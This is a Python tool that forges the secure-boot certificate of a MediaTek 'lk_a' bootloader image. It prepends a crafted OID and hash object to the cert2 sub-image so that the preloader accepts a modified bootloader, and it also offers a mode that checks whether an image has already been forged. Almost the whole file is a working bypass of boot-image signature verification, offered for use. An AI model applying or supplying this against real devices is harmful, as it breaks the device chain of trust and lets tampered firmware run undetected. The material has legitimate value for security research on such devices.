#!/usr/bin/env python3
"""Forge or verify the SBC hash prefix on an MTK `lk_a` image.

The preloader checks the image hash by walking the cert2 TLV stream and taking
the first matching OID. This tool puts an OID 2.16.886.2454.2.1 object in front
of that stream so the preloader compares against a hash we choose.

Usage:
    python3 sbc_craft.py verify lk_a.img
    python3 sbc_craft.py forge  lk_a.img out.img
"""

import argparse
import hashlib
import struct
import sys

MAGIC = 0x58881688
ALIGN = 16

# DER OID objects, copied from a stock cert2 payload.
OID_PAYLOAD = bytes.fromhex("060760867693160201")   # 2.16.886.2454.2.1
OID_HEADER = bytes.fromhex("060760867693160204")    # 2.16.886.2454.2.4

# OID .2.1 followed by a BIT STRING of 32 bytes.
PREFIX_LEN = 9 + 3 + 32


def al16(n):
    return (n + 15) & ~15


def subimages(data):
    """Walk the 0x200-byte headers. Returns a list of
    (name, header_off, payload_off, payload_len, next_off)."""
    out = []
    off = 0
    while off + 0x200 <= len(data):
        magic, size = struct.unpack_from("<II", data, off)
        if magic != MAGIC:
            break
        end = off + 0x200 + size
        if end > len(data):
            break
        name = data[off + 8:off + 0x28].split(b"\0")[0].decode("latin1")
        out.append((name, off, off + 0x200, size, al16(end)))
        off = al16(end)
    return out


def rebuild(data, subs, overrides):
    """Write headers and payloads back out, padding each payload to 16 bytes.
    overrides maps (name, index) to a replacement payload."""
    out = bytearray()
    for i, (name, hoff, poff, size, nxt) in enumerate(subs):
        body = overrides.get((name, i), data[poff:poff + size])
        header = bytearray(data[hoff:hoff + 0x200])
        struct.pack_into("<I", header, 4, len(body))
        out += header + body
        out += b"\0" * (al16(len(out)) - len(out))
    return bytes(out)


def sha256(b):
    return hashlib.sha256(b).digest()


def find_prefix(payload):
    """Return the offset of an existing forged prefix, or None."""
    if payload.startswith(OID_PAYLOAD) and payload[9:12] == b"\x03\x21\x00":
        return 0
    return None


def cert_hash(payload, oid):
    """Read the 32 bytes that follow an OID + BIT STRING in a cert payload."""
    at = payload.find(oid)
    if at < 0:
        return None
    at += len(oid)
    if payload[at:at + 2] != b"\x03\x21":
        return None
    return payload[at + 3:at + 3 + 32]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=("verify", "forge"))
    ap.add_argument("image")
    ap.add_argument("output", nargs="?")
    args = ap.parse_args()

    data = open(args.image, "rb").read()
    subs = subimages(data)
    if not subs or subs[0][0] != "lk":
        sys.exit("not an lk image (first sub-image is %r)" % (subs[0][0] if subs else None))

    lk = subs[0]
    payload = data[lk[2]:lk[2] + lk[3]]
    header = data[lk[1]:lk[1] + 0x200]

    cert2 = next((s for s in subs if s[0] == "cert2"), None)
    if cert2 is None:
        sys.exit("no cert2 sub-image found")

    cert_payload = data[cert2[2]:cert2[2] + cert2[3]]
    want_payload = sha256(payload)
    want_header = sha256(header)

    if args.mode == "verify":
        got_payload = cert_hash(cert_payload, OID_PAYLOAD)
        got_header = cert_hash(cert_payload, OID_HEADER)
        prefix = find_prefix(cert_payload)
        print("image        %s (%d bytes)" % (args.image, len(data)))
        print("sub-images   %s" % ", ".join(s[0] for s in subs))
        print("payload hash %s" % want_payload.hex())
        print("cert2 .2.1   %s" % (got_payload.hex() if got_payload else "missing"))
        print("match        %s" % ("yes" if got_payload == want_payload else "no"))
        print("header hash  %s" % want_header.hex())
        print("cert2 .2.4   %s" % (got_header.hex() if got_header else "missing"))
        print("match        %s" % ("yes" if got_header == want_header else "no"))
        print("forged prefix %s" % ("present" if prefix is not None else "absent"))
        return

    if not args.output:
        sys.exit("forge needs an output path")

    prefix = OID_PAYLOAD + b"\x03\x21\x00" + want_payload
    at = find_prefix(cert_payload)
    if at is not None:
        # Already forged: replace the hash instead of stacking another prefix.
        cert_payload = cert_payload[:at + 12] + want_payload + cert_payload[at + 12 + 32:]
        print("replacing existing prefix")
    else:
        cert_payload = prefix + cert_payload
        print("inserting 44-byte prefix")

    overrides = {("cert2", subs.index(cert2)): cert_payload}
    out = rebuild(data, subs, overrides)
    open(args.output, "wb").write(out)

    print("payload hash %s" % want_payload.hex())
    print("cert2 dsize  0x%x -> 0x%x" % (cert2[3], len(cert_payload)))
    print("image        %d -> %d bytes" % (len(data), len(out)))
    print("wrote        %s" % args.output)


if __name__ == "__main__":
    main()
